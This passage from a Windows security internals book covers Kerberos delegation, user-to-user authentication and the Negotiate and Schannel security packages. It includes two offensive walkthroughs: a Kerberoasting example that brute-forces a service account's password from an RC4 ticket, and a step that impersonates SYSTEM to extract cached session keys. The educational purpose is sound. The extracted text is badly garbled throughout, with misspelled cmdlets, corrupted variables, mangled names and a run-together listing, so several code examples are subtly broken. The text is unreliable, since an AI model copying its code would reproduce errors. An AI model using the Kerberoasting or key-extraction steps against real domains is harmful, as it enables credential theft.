  P5> {Get-ADUser -Identity alice -Properties $name} | \
    Convertto-NtSecurityDescriptor | Format-NtSecurityDescriptor -Summary
  <Owner : BUILTIN\Administrators
  <DACL>
  MINERAL\GRAPHITE$:: (Allowed)(None)(Full Access)
```

Listing 14-25: Setting resource-based delegation on a user account

This allows the GRAPHITE computer account to request a service ticket for one of the alice user's SPNs. The Get-Advertiser command exposes the full distinguished name of the target account ❶ , but if we extract the security descriptor from the attribute and format it, we see the MINERAL\ GRAPHITE\$ID in an ACE in the formatted DACL ❷ .

When transitioning from S4U2Self to S4U2proxy, the client principal doesn't need to have the TrustedToAuthPermission flag set. As a mechanism of control, the domain controller provides two group SDAs that indicate the source of the token. Table 14-2 shows these two SDAs.

Table 14-2: SIDs for Asserted Identities

<table><tr><td>Name</td><td>SID</td><td>Description</td></tr><tr><td>Authentication authority asserted identity</td><td>S-1-18-1</td><td>Token generated through authentication</td></tr><tr><td>Service asserted identity</td><td>S-1-18-2</td><td>Token generated through an S4U mechanism</td></tr><tr><td></td><td></td><td>Kerberos 489</td></tr></table>


---

The first SID indicates that the Token object was generated by providing authentication credentials to the KDC . The second SID is assigned for S4U2ref or S4U2proxy tokens. A security descriptor can use these SIDs to limit access to a service configured for resource delegation to either Kerberos-only delegation, which gets the first SID, or authentication protocol transition delegation, which gets the second.

Delegation is a dangerous feature if misconfigured, and it's easy to misconfigure. This seems especially true for transitioning from SxU2Self to SxU2Proxy through constrained delegation, through which a service could impersonate any user in the domain, including privileged users. To reduce the danger of this occurring, the system can set the AccountNotDelegated UAC flag to True on an account to block it from being used in a delegation scenario. In the GUI, this flag is called "Account is sensitive and cannot be delegated." You can set it on the domain controller using a domain administrator account by running the following PowerShell command:

```bash
PS> Set-ADUser -Identity alice -AccountNotDelegated $true
```

In Listing 14-26, we look at what this flag changes to prevent delegation.

```bash
♦ PS> Get-ADUser -Identity alice -Properties AccountNotDelegated |
     Select-Object AccountNotDelegated
     AccountNotDelegated
     --------------------
     True
     PS> $client = New-LsaClientContext -CredHandle $credout -Target
     "HTTP/graphite"
     PS> Unprotect-LsaAuthToken -Token $client.Token -Key $key |
     Format-LsaAuthToken
     <KerberosV5 KRB_AP_REQ>
     Options      : MutualAuthRequired
     <Ticket>
     Ticket Version  : 5
     Server Name    : SRV_INST - HTTP/graphite
     Realm        : MINERAL_LOCAL
  ♦ Flags        : Renewable, PreAuthent, EncPARep
     ---snip--
```

Listing 14-26: Inspecting ticket flags for an account with AccountNotDelegated set

First, we confirm that the alive user has the AccountNotDelegated flag set to True ❶ . We then request a service ticket for this user. By decrypting it, we can see that the Forwardable flag is no longer present ❷ . As explained earlier, the TGS will refuse to issue a new service ticket based on an existing service ticket if the Forwardable flag is not set. This effectively blocks delegation automatically. Note that if the Forwardable flag is set and you've just changed the value of the AccountNotDelegated flag, I'd recommend logging out, then logging back in as the user to ensure the user has no tickets cached.

Until now, we've needed an SPN configured for a user or computer in order for the KDC to select the correct shared encryption key. An

490     Chapter 14

---

alternative authentication mode is also available that allows users to authenticate to each other without an SPN. Let's finish the chapter by discussing how we can use Kerberos without configuring an SPN for a user.

## User-to-User Kerberos Authentication

The NTLM protocol can perform network authentication between unprivileged users, but because a Kerberos account needs a mapped SPN in order to grant a ticket, it shouldn't normally be able to do this. To enable authentication between unprivileged users, Windows Kerberos includes a feature called User-to-User (U2U) authentication . Figure 14 - 11 shows the basic operations of U2U authentication.

![Figure](figures/WindowsSecurityInternals_page_521_figure_003.png)

Figure 14-11: User-to-user authentication with Kerberos

In this figure, Alice wants to authenticate to a service running under Bob's account. However, Bob doesn't have an SPN registered, so when Alice makes a service ticket request ❶ , it will fail, as the KDC doesn't know the target SPN. But because the requested service name is in UPN format (that is, bob@mineral.local ), the LSA assumes that the user wants U2U authentication and instead generates a TGT-REQ message. It sends the TGT-REQ message to the service running under Bob's account ❷ .

The service accepts the TGT-REQ token, and the LSA packages bob's cached TGT into a TGT-REQ message to send back to the client ❸ (Note that the LSA simply takes the caller's cached TGT; it doesn't seem to pay any

Kerberos   491

---

attention to the UPN in the TGT-REQ. Therefore, the TGT returned might not be for the user requested, which will be important in the next step.)

Upon receipt of the TGT-REP, the LSA can package the TGT for alice and the TGT for bob into a TGS-REQ, then request a service ticket for bob on local host ❶ . The TGS can then decrypt the TGTs, verify that the extra TGT is for the requested user account, and generate a service ticket encrypted with the TGT session key for bob . If the extra TGT is not for bob , perhaps because the service was not running under bob 's account, the request will fail.

Assuming the request succeeds, the client's LSASS can package up the service ticket into an AP-REQ message to send to the service and complete the authentication . Let's run a test to see U2U authentication in operation (Listing 14-27).

```bash
PS> $credout = New-IsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
  PS> $client = New-IsaClientContext -CreditHandle $credout -Target
  bob@mineral.local
  PS> Format-IsaAuthToken -Token $client.Token
  <KerberosV5_KRB_TGT_REQ>
  Principal: bob@mineral.local
```

Listing 14-27: Initializing the U2U authentication client

First, we initialize the U2U client authentication context; note this should be running as the alive user. You should be familiar with most of this code by now; the only important difference is specifying bob@mineral.local as the target SPN ❶ . When we format the authentication token, we see a TGT-REQ message containing the desired principal ❷ . We now need the server authentication context to continue the authentication process (Listing 14-28).

```bash
PS> $credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound
  -ReadCredential
  UserName: bob
  Domain: MINERAL
  Password: 600000
  PS> $server = New-LsaServerContext -CredHandle $credin
  PS> Update-LsaServerContext -Server $server -Client $client
  PS> Format-LsaAuthToken -Token $server.Token
  @<KerberosVS KRB_TGT_REP>
  Ticket Version : 5
  Server Name    : SRV_INST - krbtgt/MINERAL..LOCAL
  Realm          : MINERAL..LOCAL
  Encryption Type : AES256_CT_HMAC_SHA1_96
  Key Version   : 2
  Cipher Text :
  00000000: 98 84 C6 F4 B3 92 66 A7 50 6E 98 C2 AF 48 70 09
  00000010: 76 E9 75 EB D6 DE FF A5 A2 E9 6F 10 A9 1E 43 FE
  --snip--
```

Listing 14-28: Creating the server authentication context and getting the TGT-REP

492    Chapter 14

---

We first create the credentials handle and read the credentials for bob from the shell. It's necessary to specify credentials for bob because otherwise the server authentication would use aier's TGT, which would fail when creating the service ticket for the bob@mineral.local SPN. With the credentials handle, we can create the server authentication context.

By formatting the returned authentication token, we can see it's a


TGT-REP with the TGT ticket ❶ . We don't know the hbkbt user's password, so we can't decrypt it, meaning there's no way of knowing whether the ticket is for bob or not. In Listing 14-29, we update the client authentication context with the TGT-REP message and print the new authentication token.

```bash
PS> Update-lsaClientContext -Client $client -Server $server
  PS> Format-lsaAuthToken -Token $client.Token
  ♦ <KerberosV5 KRB_AP REQ>
  ♦ Options        : UseSessionKey
  <Ticket>
  Ticket Version  : 5
  ♦ Server Name    : PRINCIPAL - bob
  Realm          : MINERAL_LOCAL
  Encryption Type : AES25G_CTS_HMAC_SHA1_96
  Cipher Text      :
  00000000: 26 3B A8 9D DA 13 74 9F DC 47 16 83 0C AB 4F FF
  00000010: 75 A3 45 E4 16 6F D1 E9 DA FA 71 E2 26 DE 42 8C
  --snip--
```

Listing 14-29: Continuing the U2U authentication

We can see that we now have our AP-REQ message to send to the server❶. It contains a ticket encrypted with bob's session key❷, and the target principal is bob@mineral.local❸. In Listing 14-30, we're back on the server side.

```bash
#! PS> Update-LsaServerContext -Server $server -Client $client
#! PS> Use-NtObject($token = Get-LsaAccessToken $server) {
        Get-NtLogonSession $token | Format-Table
    }
        LogonId                UserName               LogonType SessionId
    --------------------------------------
    ----------------------------- ----------------------
```

Listing 14-30: Completing U2U authentication

We complete the authentication ❶ and query the Token object, which indicates a successful logon for alice ❷ .

## Worked Examples

Let's walk through some worked examples to demonstrate how you can use the various commands in this chapter to help with security research or systems analysis.

Kerberos 493

---

## Querying the Kerberos Ticket Cache

The LSA maintains a cache of tickets requested using Kerberos for each logon session. You can query the current user's ticket cache using the Get-KerberosTicket command, as shown in Listing 14-31.

```bash
# PS> Get-KerberosTicket | Select-Object ServiceName, EndTime
                            ServiceName                     EndTime
                            ----------------------------- -----------------
                            SRV_INST - krbtgt/MINERAL.LOCAL      3/19 6:12:15 AM
                            SRV_INST - LDAP/PRIMARYDC.mineral.local/mineral.local 3/19 6:12:15 AM
# PS> Get-KerberosTicket | Select-Object -First 1 | Format-KerberosTicket
                            Ticket Version : 5
                            Server Name    : SRV_INST - krbtgt/MINERAL.LOCAL
                            Realm        : MINERAL.LOCAL
                            Encryption Type : AES256_CTS_HMAC_SHA1_96
                            Key Version    : 2
                            Cipher Text :
                            00000000: 10 F5 F3 39 C5 E1 60 BB 59 E0 CF 04 61 F6 2D CF E2
                            00000010: 94 B3 88 46 DB 69 88 FF FA F2 F8 82 52 AD 48 20 9C
                            00000020: 2D AE A4 02 48 9E 75 F3 D0 05 23 63 70 31 E4 88
                            00000030: 4F 3E 00 E7 23 DE 48 7A 00 A9 47 62 90 61 24 65
                            ---snip---
```

Listing 14-31: Querying the Kerberos ticket cache

First, we query for the tickets ❶, selecting the fields ServiceName (the ticket's SPN) and endTime (the expiration time for the ticket, at which point it must be renewed). The first ticket in the cache is the user's TGT, used for requesting service tickets ❷. In this example, we also have a service ticket for the LDAP directory server.

We can view a cached Kerberos ticket using the format-KerberosTicket command , but the ticket is still encrypted, and as we probably don't know the target service's shared key we won't be able to decrypt it. In theory, we could send the ticket to the destination service to authenticate to it directly. However, we don't have the extracted session key needed to encrypt the authentication data in a valid AP-REQ either, so we'll need to call the SSI to generate the AP-REQ based on the cached ticket.

If you have SetIcbPrivilege enabled, however, each ticket cache entry should contain the session key. Listing 14-32 shows how to query for all tickets for all local logon sessions and extract the cached session key.

```bash
PS> $sess = Get-NTLogonSession
PS> $tickets = Invoke-NTToken -System { Get-KerberosTicket -LogonSession $sess }
PS> $tickets | Select-Object ServiceName, { Format-HexDump $_.SessionKey.Key }
ServiceName
                          Format-HexDump $_.SessionKey.Key
----------------------
SRV_INST - krbtgt/MINERAL_LOCAL  EE 3D D2 F7 6F 5F 7E 06 B6 E2 4E 6C C6 36 59 64
--snlp--
```

Listing 14-32: Extracting all tickets and session keys

494    Chapter 14

---

We start by getting the list of logon sessions that can be passed to Get-KerberosTicket. We need to have SetDbPrivilege enabled to query for the tickets of any logon session except the caller's, so we impersonate the SYSTEM user while querying the cache.

Impersonating SYSTEM also allows us to get the session key. We can format the key as hex along with the SPN of the cached ticket. With both the ticket and the session key, we can implement our own authentication request to the service.

## Simple Kerberoasting

One potential reason to interact with the ticket cache is to get a ticket for Kerberosing an attack described in the “Silver Tickets and Kerberosing” box on page 465. However, you don’t need to query the cache for this attack, as you can find all the information you need using the SSPI APIs. Let’s walk through a simple example so that you can understand how the Kerberosing process works. First, in Listing 14-33, we query for all user accounts with configured SPNs.

```bash
PS> Get-ADUser -Filter {
    ObjectClass -eq 'user'
} -Properties ServicePrincipalName |
Where-Object ServicePrincipalName -ne $null |
Select SamAccountName, ServicePrincipalName
SamAccountName ServicePrincipalName
----------------------
krbtgt
        {kadmin/changepw}
alice
        {HTTP/graphite}
sqlserver
        {MS SQL/topaz.mineral.local}
```

Listing 14-33: Checking for users with configured SPNs

We see the kibqt user, and that alice still has the HTTP/graphite SPN we configured earlier in the chapter. We also see an account for a SQL server that has the SPN MSSQL/topaz.mineral.local.

We don't want to pick hbhgt as a target, as this account will have a complex password that will be difficult to brute-force (any computer account with an SPN configured also has an automatically configured complex password). We'll try to brute-force the password for the sshserver user. First we need to make a request for its SPN and receive the ticket (Listing 14-34 ).

```bash
PS> $creds = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
PS> $client = New-LsaClientContext -CredHandle $creds
-Target "MSSQL/topaz.mineral.local"
PS> Format-IsaAuthToken $client
<KerberosV5 KRB_AP_RED>
Options      :  None
<Ticket>
Ticket Version  : 5
Server Name    :  SRV INST - MSSQL/topaz.mineral.local
Realm            :  MINERAL_LOCAL
```

---

```bash
Encryption Type : ARCFOUR_HMAC_MD5
Key Version    : 2
Cipher Text    :
00000000: F3 23 A8 DB C3 64 BE 58 48 7A 4D E1 20 50 E7 B9
00000010: CB CA 17 59 A3 SC 0E 1D 6D 56 F9 B5 5C F5 EE 11
---snip--
```

Listing 14-34: Getting a service ticket for the sqlserver user

Now that we have the ticket, we can generate a key based on a list of passwords. We can then try to decrypt the ticket with each key until we find a key that works, as illustrated in Listing 14-35.

```bash
PS> $pwds = "ABC!!!!", "SQLRUS", "DBPassword"
PS> foreach($pwd in $pwds) {
  $key = Get-KerberosKey -Password $pwd -Keytype ARCFOUR_HMAC_MD5
-NameType SRV_INST -Principal "MSSQL/topaz.miner.local@0minal.local"
  $dec_token = Unprotect-LsaAuthToken -Key $key -Token $coin.Token
O if ($dec_token.Ticket.Decrypted) {
      Write-Host "Decrypted ticket with password: $pud"
      break
    }
}
Decrypted ticket with password: DBPPassword
```

Listing 14-35: Decrypting the ticket with a set of passwords

We can check if the ticket was decrypted by querying its Encrypted property ❶ . If it was decrypted, we then print the password to the console. In this case, we find that the password for the sqlserver user is DBPassword — probably not the most secure option! Note that this example script isn't very efficient or fast. It's made easier by the ticket being encrypted with the RC4 encryption algorithm; you could apply the same technique to AES, but the brute-forcing attempt will take longer, as AES key derivation is more complex.

For better performance, you're better off using another tool, such as Rubeus (https://github.com/GhostPack/Rubeus), originally developed by Will Schroeder at SpecterOps. This tool can get the ticket and use it to generate a hash that you can feed to a fast password-cracking tool such as John the Ripper (https://www.openwall.com/john/).

## Wrapping Up

This chapter contained an in-depth discussion of Kerberos, the protocol used for Windows domain authentication since Windows 2000. We examined the key distribution center implemented on the Windows domain controller, which holds the list of keys associated with all users and computers on a network, and saw how Kerberos uses these keys (typically derived from the account password) to authenticate tickets, which can then authenticate to services on the network.

496    Chapter 14

---

To support complex authentication scenarios, Kerberos allows for the delegation of credentials. We discussed this topic at length, including both constrained and unconstrained delegation as well as the associated Service for User mechanisms. We finished the chapter with a description of userto-user authentication, which allows for two users to authenticate to each other without needing to register an SPN with the domain.

The next (and final) chapter will describe some additional network


authentication protocols as well as going into more depth on how the SSPI


APIs are used.

---



---

## 15

## NEGOTIATE AUTHENTICATION AND OTHER SECURITY PACKAGES

![Figure](figures/WindowsSecurityInternals_page_529_figure_002.png)

The two previous chapters covered the two main network authentication protocols in Windows, NTLM and Kerberos. However,

Windows supports several more packages for performing authentication. In this chapter, we'll briefly cover some of these other security packages.

I'll begin by providing more detail about how applications and security packages can use buffers to pass data back and forth using the SSPI APIs. This will help you understand some of the packages' quirks. Then we'll examine the Negotiate security package, as well as the less common secure channel and CredSSP packages. I'll give a quick overview of some additional configuration options you have when setting up a network authentication context and finish up with a description of what happens when you want to use network authentication inside a process with a lowbox token.

---

## Security Buffers

So far, I've implied that using the SSI APIs is simple: you generate a client authentication token, pass it to the server application, update the server authentication context, receive a token in response, and repeat the process until the authentication is complete. However, because of the complexity of the supported network authentication protocols, these APIs can accept and return more than just an authentication token.

The authentication context, encryption, and signature APIs accept arrays of generic security buffer structures as parameters. This security buffer structure, called SecBuffer in the native SDK, is wrapped by the SecurityBuffer class in the PowerShell module. Each security buffer structure contains a field that determines what type of data the buffer represents and a sized memory buffer for the contents. You can create a buffer using the New-IsaSecurityBuffer PowerShell command, specifying the type and contents of the buffer:

```bash
PS> $buf = New-LsaSecurityBuffer -Type Data -Byte @(0, 1, 2, 3)
```

You can specify either a byte array or a string when initializing the data.


You also specify a type for the buffer. The following is a short list of the


most important buffer types you'll encounter:

Empty: Contains no data; sometimes used as a placeholder for a return value

Data — Contains initialized data; used to pass and return data, such as a message to encrypt

Token Contains a token; used to pass and return authentication tokens and signatures

PkgParams Contains additional configuration parameters for the security package

StreamHeader  Contains the header of a streaming protocol

StreamTrailer  Contains the trailer of a streaming protocol

Stream   Contains the data of a streaming protocol

Extra   Contains extra data generated by the security package

ChannelBindings     Contains the channel binding data

You can use security buffers as either input or output, depending on the security package's requirements and the API used. If you want to define an output-only buffer, you can use the Size parameter when creating the buffer:

```bash
PS> $buf = New-LsaSecurityBuffer -Type Data -Size 1000
```

Sometimes you may want to pass an initialized buffer whose contents the package shouldn't modify. To indicate this, the APIs specify two additional flags you can add to the type:

500 Chapter 15

---

ReadOnly The buffer is read-only but is not part of the signature.

ReadOnlyWithChecksum The buffer is read-only and should be part of the signature.

You specify these additional flags using the ReadOnly或 ReadOnlyWith checksum parameter when creating a buffer, as in the following example:

```bash
PS> $buf = New-LsaSecurityBuffer -Type Data -Byte @(0, 1, 2, 3) -ReadOnly
```

Whether the difference between the two read-only flags is honored depends on the security package. For example, NTLM ignores the difference and always adds a read-only buffer to the signature, while Kerberos adds the buffer as part of the signature only if the buffer you supply has the ReadOnlyWithChecksum flag.

## Using Buffers with an Authentication Context

The SSPI APIs used by the Update-LsaClientContext and Update-LsaServer

Context PowerShell commands take two lists of security buffers: one to use

as input to the API and one to use as output. You can specify the list of

these buffers using the InputBuffer and OutputBuffer parameters, as shown in

Listing 15-1.

```bash
0 PS> $in_buf = New-LsaSecurityBuffer -Type PkgParams -String "AuthParam"
0 PS> $out_buf = New-LsaSecurityBuffer -Type Data -Size 100
0 PS> Update-LsaClientContext -Client $client -Token $token -InputBuffer $in_buf
-OutputBuffer $out_buf
PS> $out_buf.Type
Extra
PS->ConvertFrom+=LsaSecuizyBuffer $out_buf | Out-HexDump
00 11 22 33
```

Listing 15-1: Using input and output buffers with an authentication context

This listing shows a hypothetical use of input and output buffers during authentication. (You'll see actual examples over the course of this chapter.) This example assumes you've already set up a client authentication context as $client and a server authentication token as $token.

We first create one input buffer of type PkgParams containing a string . The contents of the buffer depend on the package you're using; normally, the API's documentation will tell you what you need to specify. Next, we create an output buffer of type Data , allocating a maximum buffer size of 100 bytes . We then update the client context, passing it the server authentication token and the input and output buffers .

The command will add the token as a Token type buffer to the start of the input list, and will also append any channel bindings specified when creating the context. Therefore, the input buffer list passed in this case would contain the Token buffer followed by the PkgParams buffer. Sometimes

Negotiate Authentication and Other Security Packages   501

---

the package doesn't want you to include the Token buffer; in that case, you can specify the NoToken parameter to exclude it from the input list.

The command also automatically adds the output Token buffer for the new authentication token to the output list. If the API call succeeds, it will assign the contents of this buffer to the context's Token property. It's not normally necessary to exclude that buffer from the output, so the command doesn't give you that option.

After a successful call, we check the output buffer, which has been updated. Certain packages might change an output buffer's type, size, and contents. For instance, the type in this example has been changed from Data to Extra. We can convert the buffer back to a byte array using the ConvertFrom-LsaSecurityBuffer command. Displaying the output shows that the 100-byte buffer we've created now has only 4 valid bytes. The security package initialized these 4 bytes and updated the structure's length accordingly.

## Using Buffers with Signing and Sealing

Using the Buffer parameter, you can specify buffers during signing and sealing operations when calling the get-LsaContextSignature and Test-LsaContext Signature PowerShell commands, as well as Protect-LsaContextMessage and Protect-LsaContextMessage. The underlying APIs take only a single list of buffers to use for both the input and output. In Listing 15-2, we encrypt a buffer containing an additional header.

```bash
PS> $header = New-LsaSecurityBuffer -Type Data -Byte @0, 1, 3, 4) -
-ReadOnlyWithChecksum
PS> $data = New-LsaSecurityBuffer -Type Data -String "HELLO"
PS> $sig = Protect-LsaContextMessage -Context $client -Buffer $header, $data
PS> ConvertFrom-LsaSecurityBuffer -Buffer $header | Out-HexDump
00 01 03 04
PS> ConvertFrom-LsaSecurityBuffer -Buffer $data | Out-HexDump
DS 05 4F 40 22 5A 9F F9 49 66
PS> Unprotect-LsaContextMessage -Context $server -Buffer $header, $data
-Signature $sig
PS> ConvertFrom-LsaSecurityBuffer -Buffer $data -AsString
HELLO
```

Listing 15-2: Encrypting a message with buffers

We first create the header buffer, marking it as read-only with a checksum. By marking it as read-only, we ensure that the contents won't be encrypted but will still be included in the signature. Next, we create the data buffer from a string.

We then pass the buffers to Protect-LSaContextMessage. This command returns the signature for the encryption operation and updates the encrypted data in place. When dumping the buffers, we can see that the header is still unencrypted even though the data buffer has been encrypted.

502      Chapter 15

---

We can decrypt the buffer using Unprotect-LSaContextMessage in a manner similar to how we encrypted the buffer: by passing the buffers and the signature to the command. Once the buffer is decrypted, we can convert it back to a string. If the signature for the buffers isn't valid, the command will throw an error.

Now that you know how to use security buffers for the SSPI APIs, let's look at the Negotiate protocol, which allows Windows to automatically select the best authentication protocol to use based on what credentials are available to the caller.

## The Negotiate Protocol

What happens if you don't know what types of network authentication the server supports? You might first try using Kerberos and then, if it isn't supported, switch to NTLM. But that's not a very efficient use of resources. Also, if Microsoft were to later introduce a new, more secure authentication protocol, you'd have to update your application to support it. The Negotiate protocol solves both problems by allowing a client and server to negotiate the best available network authentication protocol. Microsoft's implementation of Negotiate is based on the Simple and Protected Negotiation Mechanism (SPRENGO) protocol, defined in RFC4178.

To select the Negotiate protocol, use the negotiate package in both the client and the server authentication context. The first token generated by a client authentication context contains a list of the authentication protocols the client supports. In its ASN.1 structure, it can also embed the first authentication token for whichever of the supported authentication protocols the client would prefer to use. For example, it might embed an NTLM NEGOTIATE token. In Listing 15-3, we initialize the Negotiate client authentication context.

```bash
__ PS> $credout = New-LsaCredentialHandle -Package "Negotiate" -UseFlag Outbound
__ PS> $client = New-LsaClientContext -CredHandle $credout
__ PS> Format-LsaAuthToken -Token $client.Token
__  <$PNEGO Init>
__ Mechanism list      :
__  1.3.6.1.4.1.311.2.2.10           - NTLM
__  1.2.840.48018.1.2.2             - Microsoft Kerberos
__  1.2.840.113554.1.2.2             - Kerberos
__  1.3.6.1.4.1.311.2.2.30           - Microsoft Negotiate Extended
__  <$PNEGO Token>
__ <NTLM NEGOTIATE>
Flags: Unicode, Oem, RequestTarget, Signing, LMKey, NTLM,...
Domain: MINERAL
Workstation: GRAPHITE
__ Version: 10.0.18362.15
</$PNEGO Token>
```

Listing 15-3: Initializing the Negotiate client authentication

---

We specify the credentials for using the Negotiate security package ❶ , then continue as normal by creating the context. In the formatted token, we first see SPNEO Init , which indicates that this is an initialization token ❷ . Following the header is the list of supported authentication protocols, or security mechanisms ❸ . The list is sorted in descending order of preference, so in this case, the client prefers NTLM over Kerberos. You won't see Kerberos in the list unless you're on a domain-mounted system.

You might notice the mechanism list contains two types of Kerberos: The presence of the Microsoft Kerberos identifier is due to a bug in Windows 2000: the value 113554 in the identifier, or 0x1BB92 in hexadecimal, was truncated to 16 bits, resulting in the value 0x0BB92, or 48018. Microsoft has left this mistake for backward compatibility reasons, and the two values represent the same Kerberos authentication protocol. Microsoft also defines an extended negotiation protocol, the fourth mechanism in this list, but we won't discuss it here.

Following the list of supported protocols is an authentication token . In this case, the client has chosen to send the initial NTLM Negotiate token .

The server authentication context can select the most appropriate authentication protocol it supports. Most commonly, it will use the protocol that is the client's preferred choice, determined by the ordering of the list of supported authentication protocols. However, it can also ignore the client’s preference and request a different authentication protocol if desired. It sends the selected authentication protocol and any further authentication tokens to the client. This authentication exchange process continues until either an error occurs or the process is complete. Listing 15-4 shows how the server responds to the client's request.

```bash
PS> $credin = New-LsaCredentialHandle -Package "Negotiate" -UseFlag Inbound
PS> $server = New-LsaServerContext -CredHandle $credin
PS> Update-LsaServerContext -Server $server -Token $client.Token
PS> Format-ListAuthToken -Token $server.Token
<SPNEGO Response>
Supported Mech      : 1.3.6.1.4.1.311.2.2.10 - NTLM
State           : Incomplete
<SPNEGO Token>
<NTLM CHALLENGE>
Flags        : Unicode, RequestTarget, Signing, NTLM, LocalCall, AlwaysSign,... -
--snip--
```

Listing 15-4: Continuing the Negotiate authentication on the server

We first pass the client authentication token to the server authentication context that we create. In the formatted output, we can see that it's an


SPNEGO Response, and that the server has opted to use NTLM. The response has a State flag, which indicates that the negotiation is currently incomplete. Following that is the authentication token, which, as expected, is now an NTLM CHALLENGE token.

In Listing 15-5, we complete the authentication.

504 Chapter 15

---

```bash
PS> Update-LsaClientContext -Client $client -Token $server.Token
  PS> Format-LsaAuthToken -Token $client.Token
  <SPNEGO Response>
  State               : Incomplete
  <SPNEGO Token>
  © NTLM AUTHENTICATE>
  Flags    : Unicode, RequestTarget, Signing, NTLM, LocalCall, AlwaysSign,...
  --snlp!
  PS> Update-LsaServerContext -Server $server -Token $client.Token
  PS> Format-LsaAuthToken -Token $server.Token
  <SPNEGO Response>
  State               : Completed
  PS> Update-LsaClientContext -Client $client -Token $server.Token
  PS> $client.PackageName
    NTLM
```

Listing 15-5: Completing the Negotiate authentication

The next client authentication token sent is the NTLM AUTHENTICATE token. Note that the supported authentication protocol field is not present. This is only required in the initial server token, and it's omitted from subsequent tokens.

In normal NTLM authentication, the authentication would typically complete at this point. However, in Negotiate authentication, the client's state is considered Incomplete until we generate a final server token and update the client with this token, which then marks the state as Completed . We can then query the final package using the PackageName property in which shows that we negotiated NTLM.

To negotiate the use of Kerberos, the protocol acts in a similar manner. But as Kerberos needs an SPN to function, you must specify the target name using the Target parameter when creating the client authentication context; otherwise, the protocol will select NTLM. The output of the Kerberos authentication will replace the NTLM tokens with Kerberos AP-REQ and AP-REP tokens.

Now that we've covered the Negotiate protocol, let's discuss a few less common security packages that you might encounter during an analysis of a Windows system.

## Less Common Security Packages

We've covered the three main security packages you're most likely to use on Windows: NTLM, Kerberos, and Negotiate. But there are a few other security packages that have important functions, even if you're less likely to use them directly. We won't spend very much time discussing these, but I'll give you a quick example of each so that you understand their purpose and function.

---

## Secure Channel

Sending sensitive information (like user credentials) unencrypted over the internet is generally considered a bad idea. Several network protocols can encrypt network traffic, but by far the most common is Transport Layer Security (TLS), which was once called Secure Sockets Layer (SSL) and was originally developed by Netscape in the mid-1990s to secure HTTP connections. A variant of TLS, the Datagram Transport Layer Security (DTLS) protocol, can encrypt traffic from unreliable protocols, such as the User Datagram Protocol (UDP).

Secure channel is an implementation of TLS provided as a security package, and you can access it through the Channel package using the same SSPI APIs as for other network authentication protocols. While you can use secure channel as a TLS or DTLS encryption layer for network traffic, you can also use it to provide client authentication facilities to a server through client certificates.

Let's walk through a simple example of how to use the package. Listing 15-6 starts by setting up the client credentials handle and the client authentication context.

```bash
PS> $credout = New-LsaCredentialHandle -Package "Schannel" -UseFlag Outbound
PS> $name = "NotReallyReal.com"
PS> $client = New-LsaClientContext -CredHandle $credout -Target $name
-RequestAttribute ManualCredValidation
PS> Format-LsaAuthToken -Token $client.Token
Schannel Record 0
Type   : Handshake
Version: 3.3
Data    :
        ...... 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  -  0123456789ABCDEDF
----------------------
00000000: 01 00 00 AA 03 03 60 35 C2 44 30 A9 CE C7 88 81  - ......`5_00.....
00000000: EB 67 EC F3 9A E3 FD 71 05 70 6C BB 92 19 31 C9   -g.....q.pl...1..
--snip--
```

Listing 15-6: Setting up the secure channel client authentication context

When setting up the context, you need to specify a target name, which is typically the DNS name of the server. The protocol uses this target name to verify that the server has a valid certificate for that name. TLS connections can also be cached, so the protocol can check whether an existing cache entry exists for the target name. In this case, the name won't matter because we specify the @authored@idiation request attribute, which disables the server certificate checks so that we can use a self-signed certificate for the server.

We then format the authentication token, which displays the TLS protocol’s simple record structure (shown in Figure 15-1).

506   Chapter 15

---

![Figure](figures/WindowsSecurityInternals_page_537_figure_000.png)

Figure 15-1: The TLS record structure

The record structure contains a 5-byte header consisting of a record type, the major and minor versions of the protocol, and a data length. The header is followed by a list of bytes whose interpretation depends on the record type. In Listing 15-6, the type is handshake, a record used during the connection setup to negotiate the encryption protocol to use, exchange certificates, and communicate the encryption keys. Its version is 3.3, which corresponds to TLS 1.2. (The designers of the protocol considered TLS to be a minor addition to SSL 3.0, so they increased only its minor version number.)

In Listing 15-7, we generate an X.509 certificate and finish setting up the server side of the secure channel authentication.

```bash
PS> $store = "cert:UserID:My"~  @PS$cert = Get-ChildItem $store | Where-Object Subject -Match $name~  @PS if ($snull -eq $cert) {~  @PS $cert = New-SelfSignedCertificate -DnsName $name -CertStoreLocation $store~}@PS $server_cred = Get-LsaChannelCredential -Certificate $cert~  @PS $credin = New-LsaCredentialHandle -Package "Schannel" -UseFlag Inbound~-Credential $server_cred~  @PS $server = New-LsaServerContext -CreditHandler $credin~  @PS while((Test-LsaContext $client) and ((Test-LsaContext $server)) {~    Update-LsaServerContext -Server $server -Client $client~    Update-LsaClientContext -Client $client -Server $server~}~  Listing 15-7: Initializing a security channel server context and completing authentication
```

We start by checking whether we have a certificate whose subject name is the DNS name we specified when creating the client authentication context ❶ . PowerShell exposes the system's certificate store via the Cert drive provider. In this case, we check only the current user's personal certificate store for a matching certificate.

If the certificate doesn't already exist, we create a new one using the New-SelfSignedCertificate command with the DNS name as the subject, storing it in the current user's personal store . This certificate isn't trusted for the TLS certificate chain. You could add the new certificate to Cert\ CurrentUserRoot, which would make it trusted; however, it's safer to just disable the certificate checking in the client for this example.

---

To use the certificate for the server, we need to create a set of secure channel credentials, specifying the certificate for use by the server ❸ . Note that the certificate must have an associated private key for the server to use. If you pick a certificate without the private key, this line of code will generate an error. We can use the credentials to create a handle and, from that, the server authentication context.

Finally, we exchange tokens between the server and client authentication context until the authentication completes . Of course, in a real application this process would exchange the tokens over a network connection, but for the sake of simplicity, we ignore the network entirely here.

Before we do anything else, we can inspect the negotiated security information, as shown in Listing 15-8.

```bash
PS> $client.ConnectionInfo
Protocol      Cipher  Hash   Exchange
-------       ---------  ---------        -----------------
TLS1_2_CLIENT AES_256 SHA_384 ECDH_EPHEM
PS> $client.RemoteCertificate
Thumbprint                          Subject
----------------------------- ---------
2A814A450D93FE86BA45C4A1F7046459D75176  CN=NotReallyReal.com
PS> $server.ConnectionInfo
Protocol      Cipher  Hash   Exchange
-------       ---------    ---------        -----------------
TLS1_2_SERVER AES_256 SHA_384 ECDH_EPHEM
```

Listing 15-8: Inspecting the connection information

Note that the ConnectionInfo property returns the negotiated protocol and encryption algorithms. In this case, we've negotiated TLS 1.2 using the AES256 encryption algorithm, SHA384 for integrity, and elliptic curve Diffie-Hellman to exchange an ephemeral encryption key.

